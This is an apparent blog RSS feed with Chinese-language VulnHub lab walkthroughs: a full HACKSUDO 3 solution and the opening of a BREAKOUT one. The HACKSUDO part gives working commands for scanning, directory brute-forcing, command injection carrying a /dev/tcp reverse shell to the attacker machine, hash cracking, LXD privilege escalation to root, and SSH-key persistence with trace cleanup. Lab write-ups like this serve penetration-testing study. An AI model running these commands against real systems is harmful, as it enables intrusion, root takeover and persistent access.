<?xml version="1.0"?>
<rss version="2.0">
    <channel>
        <title>X_T • Posts by &#34;vulnhub&#34; category</title>
        <link>https://n1h1l157.github.io</link>
        <description>人生如逆旅，我亦是行人</description>
        <language>zh-CN</language>
        <pubDate>Mon, 01 Nov 2021 00:00:00 +0800</pubDate>
        <lastBuildDate>Mon, 01 Nov 2021 00:00:00 +0800</lastBuildDate>
        <category>ENFP</category>
        <category>ENFJ</category>
        <category>ENTJ</category>
        <category>ESFJ</category>
        <category>ENTP</category>
        <category>ESTP</category>
        <category>ESTJ</category>
        <category>INFJ</category>
        <category>ESFP</category>
        <category>ISFJ</category>
        <category>INTP</category>
        <category>INFP</category>
        <category>ISFP</category>
        <category>INTJ</category>
        <category>ISTJ</category>
        <category>ISTP</category>
        <category>MBTI</category>
        <category>心理测试</category>
        <category>VULNHUB 1-10</category>
        <category>VULNHUB 11-20</category>
        <category>VULNHUB 21-30</category>
        <category>VULNHUB 31-40</category>
        <category>VULNHUB 41-50</category>
        <category>渗透测试</category>
        <category>信息安全网址</category>
        <category>Trojan</category>
        <category>Linux</category>
        <category>生命</category>
        <category>人生</category>
        <category>命运</category>
        <category>成长</category>
        <category>神学</category>
        <category>意义</category>
        <category>人生哲学</category>
        <category>社会</category>
        <category>爱情</category>
        <category>历史</category>
        <category>人性</category>
        <category>道德</category>
        <item>
            <guid isPermalink="true">https://n1h1l157.github.io/2021/11/01/VULNHUB/103%20HACKSUDO/</guid>
            <title>VULNHUB 3 HACKSUDO</title>
            <link>https://n1h1l157.github.io/2021/11/01/VULNHUB/103%20HACKSUDO/</link>
            <category>VULNHUB 1-10</category>
            <pubDate>Mon, 01 Nov 2021 00:00:00 +0800</pubDate>
            <description><![CDATA[ &lt;p&gt;靶机下载地址：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvaGFja3N1ZG8tMyw2NzEv&#34;&gt;https://www.vulnhub.com/entry/hacksudo-3,671/&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;确认攻击目标&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#确认攻击目标&#34;&gt;#&lt;/a&gt; 确认攻击目标&lt;/h3&gt;
&lt;p&gt;攻击机 KALI： 192.168.31.135&lt;br&gt;
 靶机 HACKSUDO：桥接于 1 92.168.31.1 的网卡，ip 未知&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;通过 netdiscover 扫描当前网卡里边有哪些机器&lt;br&gt;
 &lt;code&gt;sudo netdiscover -i eth0 -r 192.168.31.0/24&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-032.png&#34; alt&gt;&lt;/p&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;将所有已知的 ip 暂时存档，对这类 ip 地址不做端口扫描&lt;/li&gt;
&lt;/ol&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;shell&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;cat &amp;gt; myip.txt &amp;lt;&amp;lt; EOF&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;192.168.31.1 192.168.31.25 192.168.31.58 192.168.31.86 192.168.31.33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;192.168.31.120 192.168.31.135 192.168.31.145 192.168.31.162 192.168.31.44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;EOF&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;ol start=&#34;3&#34;&gt;
&lt;li&gt;去除一些已知 ip 的机器，对剩余 IP 进行端口扫描，判断目标 IP&lt;br&gt;
 &lt;code&gt;sudo nmap -PA 192.168.31.0/24 --excludefile myip.txt&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-033.png&#34; width=&#34;550&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 目标机器的 ip 地址： 192.168.31.141&lt;/p&gt;
&lt;h3 id=&#34;端口扫描&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#端口扫描&#34;&gt;#&lt;/a&gt; 端口扫描&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;sudo nmap -A -p 1-1024 192.168.31.141 - oN /tmp/hacksudo.txt&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-034.png&#34; width=&#34;580&#34; alt=&#34;Image&#34;&gt;
&lt;h3 id=&#34;目录爆破并反弹shell&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#目录爆破并反弹shell&#34;&gt;#&lt;/a&gt; 目录爆破并反弹 shell&lt;/h3&gt;
&lt;p&gt;打开网站：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMTQx&#34;&gt;http://192.168.31.141&lt;/span&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;对此网站进行目录扫描&lt;br&gt;
 &lt;code&gt;dirsearch -u http://192.168.31.141&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-035.png&#34; width=&#34;350&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMTQxL2xvZ2luLnBocA==&#34;&gt;http://192.168.31.141/login.php&lt;/span&gt; 尝试弱口令，万能密码均失败&lt;/p&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;加载比较全面一点的字典，来扩大目录，看是否能得到更多的信息&lt;/li&gt;
&lt;/ol&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;gobuster dir -u http://192.168.31.141 -x php,txt,html,bak,zip -w&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-036.png&#34; width=&#34;570&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMTQxL2dlbmVyYXRvci5waHAj&#34;&gt;http://192.168.31.141/generator.php#&lt;/span&gt; 存在 REC 代码执行漏洞&lt;/p&gt;
&lt;ol start=&#34;3&#34;&gt;
&lt;li&gt;对 http://192.168.31.141/generator.php# 网站进行攻击&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;疑似 figlet xx 的命令，构造 figlet xx&amp;amp;ls 可执行更多的 linux 命令&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;在此位置输入反弹shell的命令，并监听端口&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;nc lvvp 4444&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;1 &amp;amp; bash -c &amp;#x27;bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.31.135/4444 0&amp;gt;&amp;amp;1&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-037.png&#34; width=&#34;500&#34; alt=&#34;Image&#34;&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;使终端窗口变为一个标准的终端&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;python3 -c &amp;#x27;import pty;pty.spawn(&amp;quot;/bin/bash&amp;quot;)&amp;#x27; - &amp;gt; ctrl+z&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;stty raw -echo;fg -&amp;gt; enter,enter&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;export TERM=xterm&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-038.png&#34; width=&#34;570&#34; alt=&#34;Image&#34;&gt;
&lt;h3 id=&#34;凯撒加密&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#凯撒加密&#34;&gt;#&lt;/a&gt; 凯撒加密&lt;/h3&gt;
&lt;p&gt;翻阅文件，这里找到一个类似于 “凯撒加密” 的文件&lt;/p&gt;
&lt;p&gt;提示：凯撒密码是一种位移加密方式，只对 26 个字母进行位移替换加密，规则简单。例如，当偏移量是 2 的时候，所有的字母 A 将被替换成 C，B 变成 D，以此类推。如果您输入的是中英文组合，则只会对英文加密解密&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-039.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;在线进行凯撒解密，偏移为 13 ：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL21vZXJzaW1hLjAwY2hhLm5ldC9rYWlzYW1pbWEuYXNw&#34;&gt;http://moersima.00cha.net/kaisamima.asp&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-040.png&#34; alt&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;解密后的数据为：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;hacksudo locker SSH username:hacksudo&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;password:63c9142792d571d0f7c28eb30626d6f38792a2e7679b76d784231676d62 447fb80af8953745f709c6622dda2cb4d754c262d0d31b3030a08f7b524079a6b336b&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&#34;sha-512加密&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#sha-512加密&#34;&gt;#&lt;/a&gt; SHA 512 加密&lt;/h3&gt;
&lt;p&gt;密码又被进行了一层 hash 散列加密&lt;br&gt;
在线 hash 解密：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9jcmFja3N0YXRpb24ubmV0Lw==&#34;&gt;https://crackstation.net/&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-041.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;-&amp;gt; 得到 hacksudo 的用户名：hacksudo 密码：vishal&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;登陆到此用户&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;su hacksudo &lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-042.png&#34; alt&gt;&lt;/p&gt;
&lt;h3 id=&#34;lxd-提权&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#lxd-提权&#34;&gt;#&lt;/a&gt; LXD 提权&lt;/h3&gt;
&lt;p&gt;发现了 id 之后有 lxd 补充组，尝试 lxd 提权&lt;br&gt;
 lxd 提权指南：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ib29rLmhhY2t0cmlja3MueHl6L2xpbnV4LXVuaXgvcHJpdmlsZWdlLWVzY2FsYXRpb24vaW50ZXJlc3RpbmctZ3JvdXBzLWxpbnV4LXBlL2x4ZC1wcml2aWxlZ2UtZXNjYWxhdGlvbg==&#34;&gt;https://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation&lt;/span&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;在kali机器上下载lxd的文件，并通过scp发送至靶机：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;wget https://github.com/saghul/lxd-alpine-builder/archive/refs/heads/master.zip&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;scp -r parallels@192.168.31.135:~/Desktop/tool/lxd/lxd /tmp/lxd&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;自定义镜像&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sed -i &amp;#x27;s,yaml_path=&amp;quot;latest-stable/releases/$apk_arch/latest-&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;releases.yaml&amp;quot;,yaml_path=&amp;quot;v3.8/releases/$apk_arch/latest-releases.yaml&amp;quot;,&amp;#x27; build-&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;alpine&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sudo ./build-alpine -a i&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;引入镜像&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;lxc image import alpine*.tar.gz --alias myimage&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;lxd init&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;lxc init myimage mycontainer -c security.privileged=true&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;lxc config device add mycontainer mydevice disk source=/ path=/mnt/root&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;recursive=true&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;lxc start mycontainer&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;lxc exec mycontainer /bin/sh&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-044.png&#34; width=&#34;430&#34; alt=&#34;Image&#34;&gt;
&lt;h3 id=&#34;配置ssh-keygen维权&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#配置ssh-keygen维权&#34;&gt;#&lt;/a&gt; 配置 ssh-keygen 维权&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;服务器操作&lt;/li&gt;
&lt;/ol&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;生成私钥和公钥：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ssh-keygen -t rsa&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;保存公钥至认证文件：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;cat ~/.ssh/id_rsa.pub &amp;gt;&amp;gt; ~/.ssh/authorized_keys&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;客户端操作：&lt;/li&gt;
&lt;/ol&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;下载私钥：&lt;/span&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;scp hacksudo@192.168.31.141:~/.ssh/id_rsa.&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;改变文件权限：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;chmod 700 vulnhub_hacksudo&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;免密登陆服务器：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ssh hacksudo@192.168.31.141 -i ~/.ssh/vulnhub_hacksudo&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;ol start=&#34;3&#34;&gt;
&lt;li&gt;靶机消除痕迹&lt;/li&gt;
&lt;/ol&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;销毁服务端的痕迹：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;rm -f ~/.ssh/id_rsa &amp;amp;&amp;amp; rm -f ~/.ssh/id_rsa.pub&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-045.png&#34; width=&#34;550&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 免密登陆 root 失败，但可以免密登陆账户 hacksudo&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;下次登陆此服务器需要&lt;/span&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ssh hacksudo@192.168.31.141&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;在hacksudo账户内使用如下命令可直接进入root&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;lxc exec mycontainer /bin/sh &lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://n1h1l157.github.io/2021/11/01/VULNHUB/104%20BREAKOUT/</guid>
            <title>VULNHUB 4 BREAKOUT</title>
            <link>https://n1h1l157.github.io/2021/11/01/VULNHUB/104%20BREAKOUT/</link>
            <category>VULNHUB 1-10</category>
            <pubDate>Mon, 01 Nov 2021 00:00:00 +0800</pubDate>
            <description><![CDATA[ &lt;p&gt;靶机下载地址：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvZW1waXJlLWJyZWFrb3V0LDc1MS8=&#34;&gt;https://www.vulnhub.com/entry/empire-breakout,751/&lt;/span&gt;&lt;br&gt;
 教程链接地址：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9yZWFkeXNldGV4cGxvaXQud29yZHByZXNzLmNvbS8yMDIyLzAyLzIwL3Z1bG5odWItYnJlYWtvdXQv&#34;&gt;https://readysetexploit.wordpress.com/2022/02/20/vulnhub-breakout/&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;确认攻击目标&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#确认攻击目标&#34;&gt;#&lt;/a&gt; 确认攻击目标&lt;/h3&gt;
&lt;p&gt;攻击机 KALI： 192.168.31.135&lt;br&gt;
 靶机 NAPPING：桥接于 192.168.31.1 的网卡，ip 未知&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;通过 netdiscover 扫描当前网卡里边有哪些机器&lt;br&gt;
 &lt;code&gt;sudo netdiscover -i eth0 -r 192.168.31.0/24&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-046.png&#34; alt&gt;&lt;/p&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;将所有已知的 ip 暂时存档，对这类 ip 地址不做端口扫描&lt;/li&gt;
&lt;/ol&gt;
